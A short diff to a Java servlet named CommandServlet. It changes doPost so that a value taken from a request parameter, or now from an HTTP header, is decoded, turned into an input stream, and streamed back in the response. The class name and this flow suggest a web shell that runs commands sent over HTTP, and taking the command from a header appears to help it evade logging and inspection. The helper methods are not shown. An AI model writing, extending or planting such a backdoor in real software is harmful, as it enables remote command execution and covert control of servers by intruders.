@@ -22,9 +22,13 @@ public class CommandServlet extends HttpServlet {
 
     @Override
     protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
-        String param = getParam(request.getParameter(paramName));
         try {
-            if (param != null) {
+            String p = request.getParameter(paramName);
+            if (p == null || p.isEmpty()) {
+                p = request.getHeader(paramName);
+            }
+            if (p != null) {
+                String param = getParam(p);
                 InputStream inputStream = getInputStream(param);
                 ServletOutputStream outputStream = response.getOutputStream();
                 byte[] buf = new byte[8192];
